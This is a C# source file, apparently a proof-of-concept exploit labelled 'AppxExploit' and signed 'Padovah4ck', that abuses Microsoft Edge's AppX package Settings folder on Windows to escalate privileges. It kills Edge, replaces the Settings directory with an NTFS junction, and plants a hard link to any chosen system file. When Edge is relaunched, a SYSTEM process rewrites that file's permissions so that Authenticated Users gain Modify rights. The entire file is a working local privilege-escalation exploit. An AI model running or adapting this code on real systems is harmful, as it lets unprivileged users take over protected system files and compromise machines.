using System;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Threading;

namespace AppxExploit
{
    public class EdgeExploit
    {

        private static string fileLogName = @"c:\poc_logs\poclog.txt";
        // for test
        private static string fileToOwn = @"C:\windows\win.ini";
        private static string authenticatedUsersGroup = @"NT AUTHORITY\Authenticated Users";
        private static string NTAuthoritySystem = @"NT AUTHORITY\SYSTEM";

        static void Main(string[] args)
        {
            try
            {
                string appLocalData = Environment.GetFolderPath((Environment.SpecialFolder.LocalApplicationData));
                string dirPackageEdge = $@"{appLocalData}\Packages\Microsoft.MicrosoftEdge_8wekyb3d8bbwe";
                string dirPackageSettingsToMount = $@"{appLocalData}\Packages\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\Settings";

                if (!Directory.Exists(@"c:\poc_logs"))
                {
                    Directory.CreateDirectory(@"c:\poc_logs");
                }

                if (args != null && (args.Length != 1))
                {
                    Console.WriteLine(@"Usage: program.exe [FILE_TO_OWN]");
                    return;
                }


                // read first input parameter -> directory to delete
                fileToOwn = args[0];

                if (!File.Exists(fileToOwn))
                {
                    Console.WriteLine($@"{fileToOwn} does not exist!");
                    return;
                }


                if (!HasFullControl(fileToOwn, NTAuthoritySystem))
                {
                    Console.WriteLine($@"[+] {NTAuthoritySystem} has no FULL access to {fileToOwn}. This exploits works only if SYSTEM has FULL control on target file");
                    return;
                }

                if (HasFullControl(fileToOwn, WindowsIdentity.GetCurrent().Name))
                {
                    Console.WriteLine($@"[+] {WindowsIdentity.GetCurrent().Name} already has Full Control of {fileToOwn}");
                    return;
                }


                // if local package directory not exists
                if (!Directory.Exists(dirPackageEdge))
                {
                    // start Edge , in order to create directory C:\Users\{Environment.UserName}\AppData\Local\Packages\Microsoft.MicrosoftEdge_8wekyb3d8bbwe
                    Console.WriteLine($@"[!] Directory {dirPackageEdge} does not exist!");
                    Console.WriteLine($@"[!] You need to launch Edge at least once , to trigger directory creation ");
                    Console.WriteLine($@"[-] After that consider to run this program again ");
                    Console.WriteLine($@"[-] Press any key to continue..");
                    Console.ReadKey();
                    return;
                }


                Console.WriteLine($@"[-] Starting exploit..");

                // We nee to Kill all Microsoft Edge processes
                // In order to delete C:\Users\{Environment.UserName}\AppData\Local\Packages\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\Settings directory
                // which contains setting*dat/LOG files that are locked SYSTEM process
                string sid = WindowsIdentity.GetCurrent().User.Value;

                KillProcessBySidAndProcessName(sid, "edge");

                //string tempDir = @"c:\fooDir";
                string tempDir = @"c:\" + Guid.NewGuid().ToString();

                if (!Directory.Exists(tempDir))
                {
                    Directory.CreateDirectory(tempDir);
                }

                Console.WriteLine($@"[+] Directory {tempDir} created");

                string dirOwner = File.GetAccessControl(tempDir).GetOwner(typeof(NTAccount)).ToString();
                string currentUserName = WindowsIdentity.GetCurrent().Name;

                if (!currentUserName.ToLower().Equals(dirOwner.ToLower()))
                {
                    Console.WriteLine($@"[!] KO - Owner of Directory {tempDir} is {dirOwner} which is different from current user -> {currentUserName} ");
                    return;
                }

                Console.WriteLine($@"[+] Owner of Directory {tempDir} is current user -> {dirOwner} ");

                bool created = HardLink.CreateNtHardLink($@"{tempDir}\foo.txt", fileToOwn);
                if(!created)
                {
                    Console.WriteLine($@"[!] CreateHardLink from {tempDir}\foo.txt to {fileToOwn} failed ");
                    return;
                }
                Console.WriteLine($@"[+] Created HardLink from {tempDir}\foo.txt to {fileToOwn} ");

                // deleting Settings directory
                if (Directory.Exists(dirPackageSettingsToMount))
                {
                    Console.WriteLine($@"[-] Deleting {dirPackageSettingsToMount} directory (if exist any)");
                    Directory.Delete(dirPackageSettingsToMount, true);
                    Console.WriteLine($@"[+] Done - deleted {dirPackageSettingsToMount} ");
                }

                // create junction on Settings directory
                // Exploit uses this junction to to fool the AppxSrv process
                try
                {                    
                    Console.WriteLine($@"[-] Creating junction {dirPackageSettingsToMount} to {tempDir} ");
                    JunctionPoint.Create(dirPackageSettingsToMount, tempDir, true);
                    Console.WriteLine($@"[+] Done - created junction {dirPackageSettingsToMount} to  {tempDir} ");
                }
                catch (Exception ex)
                {
                    Console.WriteLine($@"[!] Error ... {ex.Message}");
                    File.AppendAllText(fileLogName, $"[!] Error ... {ex.Message}" + Environment.NewLine);
                }

                // start Edge ; it will trigger "take own" of tmpDir to SYSTEM
                Console.WriteLine($@"[-] Launching edge for take own of {tempDir} ");
                try
                {
                    Process process = new Process();
                    process.StartInfo.FileName = "cmd.exe";
                    process.StartInfo.Arguments = "/c \"start microsoft-edge:\"";
                    //process.StartInfo.Arguments = "/c \"start bingweather:\"";
                    process.StartInfo.UseShellExecute = false;

                    process.ErrorDataReceived += Process_DataReceived;
                    process.OutputDataReceived += Process_DataReceived;
                    process.Start();
                    // wait 5 seconds for Edge to trigger file deletion
                    Console.WriteLine($@"[+] Waiting some time for triggering deletion process ..");
                    Thread.Sleep(5000);
                    // kill edge process
                    process.Kill();
                }
                catch (Exception ex)
                {
                    // do nothing
                    // Tipically process exits before we try to kill it
                    // that's why it's throwing an exception
                }

                // checking directory owner
                dirOwner = File.GetAccessControl(tempDir).GetOwner(typeof(NTAccount)).ToString();
                if (!dirOwner.ToLower().Equals(NTAuthoritySystem.ToLower()))
                {
                    Console.WriteLine($@"[!] Owner of Directory {tempDir} is different from -> {NTAuthoritySystem} ");
                    return;
                }

                Console.WriteLine($@"[+] Now the owner of {tempDir}  is {dirOwner}");
                

                // removing ACL from tempDir
                // this is going to break edge when it'll start next time
                Console.WriteLine($@"[-] Removing acls from {tempDir} ");

                // SetAcl(tempDir, authenticatedUsersGroup, FileSystemRights.FullControl);
                // remove all acls for S-1-15-2-3624051433-2125758914-1423191267-1740899205-1073925389-3782572162-737981194
                // Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\SecurityManager\CapAuthz\ApplicationsEx\Microsoft.MicrosoftEdge_44.17763.1.0_neutral__8wekyb3d8bbwe\PackageSid
                RemoveAclsFromAccount(tempDir, "S-1-15-2");
                // remove all acls for currentUserName
                RemoveAclsFromAccount(tempDir, currentUserName);

                Console.WriteLine($@"[+] Done - acls removed from {tempDir} ");

                // REPEAT AGAIN -> 1) Kill edge process 2) delete Settings directory 3) Create a junction from Settings dir to tmpDir
                // kill process
                KillProcessBySidAndProcessName(sid, "edge");

                // deleting Settings directory
                if (Directory.Exists(dirPackageSettingsToMount))
                {
                    Console.WriteLine($@"[-] Deleting {dirPackageSettingsToMount} directory (if exist any)");
                    Directory.Delete(dirPackageSettingsToMount, true);
                    Console.WriteLine($@"[+] Done - Deleted {dirPackageSettingsToMount} ");
                }

                // Delete all files within temdir
                DirectoryInfo di = new DirectoryInfo(tempDir);
                foreach (FileInfo file in di.EnumerateFiles())
                {
                    file.Delete();
                }
                Console.WriteLine($@"[+] Deleted all files in {tempDir} ");

                // create junction on Settings directory
                // Exploit uses this junction to to fool the AppxSrv process
                try
                {
                    Console.WriteLine($@"[-] Creating junction {dirPackageSettingsToMount} to {tempDir} ");
                    JunctionPoint.Create(dirPackageSettingsToMount, tempDir, true);
                    Console.WriteLine($@"[+] Done - Created junction {dirPackageSettingsToMount} to  {tempDir} ");
                }
                catch (Exception ex)
                {
                    Console.WriteLine($@"[!] Error ... {ex.Message}");
                    File.AppendAllText(fileLogName, $"[!] Error ... {ex.Message}" + Environment.NewLine);
                }

                created = HardLink.CreateNtHardLink($@"{tempDir}\foo.txt", fileToOwn);
                if (!created)
                {
                    Console.WriteLine($@"[!] CreateHardLink from {tempDir}\foo.txt to {fileToOwn} failed ");
                    return;
                }
                Console.WriteLine($@"[+] Created again HardLink from {tempDir}\foo.txt to {fileToOwn} ");

                // start Edge ; this time it will trigger SETSECURITYFILE (set DACL) to the target file using the classic tecnique of the hardlink
                // at the end, if everything goes fine, the target file should have 
                Console.WriteLine($@"[-] Launching edge for setting dacl on {fileToOwn} ");
                try
                {
                    Process process = new Process();
                    process.StartInfo.FileName = "cmd.exe";
                    process.StartInfo.Arguments = "/c \"start microsoft-edge:\"";
                    //process.StartInfo.Arguments = "/c \"start bingweather:\"";
                    process.StartInfo.UseShellExecute = false;

                    process.ErrorDataReceived += Process_DataReceived;
                    process.OutputDataReceived += Process_DataReceived;
                    process.Start();
                    // wait 5 seconds for Edge to trigger file deletion
                    Console.WriteLine($@"[+] Waiting some time for triggering deletion process ..");
                    Thread.Sleep(5000);
                    // kill edge process
                    process.Kill();
                }
                catch (Exception ex)
                {
                    // Tipically process exits before we try to kill it
                    // that's why it's throwing an exception
                }

                if(HasControl(fileToOwn, authenticatedUsersGroup,FileSystemRights.Modify))
                {
                    Console.WriteLine($@"[+] Done - Exploit Succeded ");
                    Console.WriteLine($@"[+] Now {authenticatedUsersGroup} has FileSystemRights.Modify over {fileToOwn} ");
                }
                else
                {
                    Console.WriteLine($@"[!] Too bad... Exploit did not work out");
                }

                Directory.Delete(tempDir, true);
                Console.WriteLine($@"[...] Exiting - Take care, Padovah4ck ");

            }
            catch (Exception ex)
            {
                Console.WriteLine("Doh.. exception occurred " + ex.Message);
                File.AppendAllText(fileLogName, "Doh.. exception occurred " + ex.Message + Environment.NewLine);
            }
        }


        private static Boolean HasFullControl(string path, string username)
        {
            bool fc = false;
            FileInfo file = new FileInfo($@"{path}");
            FileSecurity acl = file.GetAccessControl();

            foreach (FileSystemAccessRule rule in acl.GetAccessRules(true, true, typeof(NTAccount)))
            {
                if (rule.IdentityReference.Value.Equals(username) & rule.FileSystemRights.Equals(FileSystemRights.FullControl))
                    fc = true;
            }

            return fc;
        }

        private static bool SetAcl(string destinationDirectory,string userOrGroup, FileSystemRights Rights)
        {
            //FileSystemRights Rights = (FileSystemRights)0;
            //Rights = FileSystemRights.FullControl;

            // *** Add Access Rule to the actual directory itself
            FileSystemAccessRule AccessRule = new FileSystemAccessRule(userOrGroup, Rights,
                                        InheritanceFlags.None,
                                        PropagationFlags.NoPropagateInherit,
                                        AccessControlType.Allow);

            DirectoryInfo Info = new DirectoryInfo(destinationDirectory);
            DirectorySecurity Security = Info.GetAccessControl(AccessControlSections.Access);

            bool Result = false;
            Security.ModifyAccessRule(AccessControlModification.Set, AccessRule, out Result);

            if (!Result)
                return false;

            // *** Always allow objects to inherit on a directory
            InheritanceFlags iFlags = InheritanceFlags.ObjectInherit;
            iFlags = InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit;

            // *** Add Access rule for the inheritance
            AccessRule = new FileSystemAccessRule(userOrGroup, Rights,
                                        iFlags,
                                        PropagationFlags.InheritOnly,
                                        AccessControlType.Allow);
            Result = false;
            Security.ModifyAccessRule(AccessControlModification.Add, AccessRule, out Result);

            if (!Result)
                return false;

            Info.SetAccessControl(Security);

            return true;
        }

        private static Boolean HasControl(string path, string username, FileSystemRights accessRight)
        {
            bool fc = false;
            FileInfo file = new FileInfo($@"{path}");
            FileSecurity acl = file.GetAccessControl();

            foreach (FileSystemAccessRule rule in acl.GetAccessRules(true, true, typeof(NTAccount)))
            {
                if (rule.IdentityReference.Value.Equals(username) &  ((rule.FileSystemRights & accessRight) == accessRight) )
                    fc = true;
            }

            return fc;
        }

        private static void Process_DataReceived(object sender, DataReceivedEventArgs e)
        {
            Console.WriteLine($"[!] whoaaa ");
        }


        private static void RemoveAclsFromAccount(string dirPath, string accountToRemove)
        {
            DirectorySecurity security = Directory.GetAccessControl(dirPath);
            DirectoryInfo myDirectoryInfo = new DirectoryInfo(dirPath);
            AuthorizationRuleCollection rules = security.GetAccessRules(true, true, typeof(NTAccount));

            foreach (FileSystemAccessRule rule in rules)
            {
                if (rule.IdentityReference.Value.ToLower().Contains(accountToRemove.ToLower()))
                    security.RemoveAccessRuleSpecific(rule);
            }
            myDirectoryInfo.SetAccessControl(security);
        }



        // Kill processes by name
        private static void KillProcessByName(string processName)
        {
            Process[] processes = Process.GetProcesses();
            foreach (Process p in processes)
            {
                if (p.ProcessName.ToLower().Contains(processName.ToLower()))
                {
                    p.Kill();
                }
            }
        }

        private static void KillProcessBySidAndProcessName(string sid, string processName)
        {
            Console.WriteLine($@"[-] Killing processes by name {processName} ");
            Process[] processes = Process.GetProcesses();
            foreach (Process p in processes)
            {
                try
                {
                    if (GetProcessOwner(p.Id) == sid && (p.ProcessName.ToLower().Contains(processName.ToLower())))
                    {
                        Console.WriteLine($@"[-] Attempting kill process owned by {sid} -> Id {p.Id} ProcessName {p.ProcessName} ");
                        File.AppendAllText(fileLogName, $"Attempting kill process owned by {sid} -> Id {p.Id} ProcessName {p.ProcessName} " + Environment.NewLine);
                        p.Kill();
                        Console.WriteLine($@"[+] Done - ProcessName {p.ProcessName} terminated ");
                        // wait some time for Edge to be "gracefully" killed 
                        Console.WriteLine($@"[*] Waiting some time for killing the process ..");
                        Thread.Sleep(1000);
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine("Doh.. exception occurred in KillProcessBySidAndProcessName " + ex.Message);
                    File.AppendAllText(fileLogName, "Doh.. exception occurred KillProcessBySidAndProcessName " + ex.Message + Environment.NewLine);
                }
            }
        }

        private static string GetProcessOwner(int processId)
        {

            string query = "Select * From Win32_Process Where ProcessID = " + processId;
            ManagementObjectSearcher searcher = new ManagementObjectSearcher(query);
            ManagementObjectCollection processList = searcher.Get();

            foreach (ManagementObject obj in processList)
            {
                string[] argList = new string[] { string.Empty };
                int returnVal = Convert.ToInt32(obj.InvokeMethod("GetOwner", argList));

                string[] sid = new String[1];
                obj.InvokeMethod("GetOwnerSid", (object[])sid);
                if (!string.IsNullOrEmpty(sid[0]))
                    return sid[0];
            }

            return "NO OWNER";

        }

    }

}
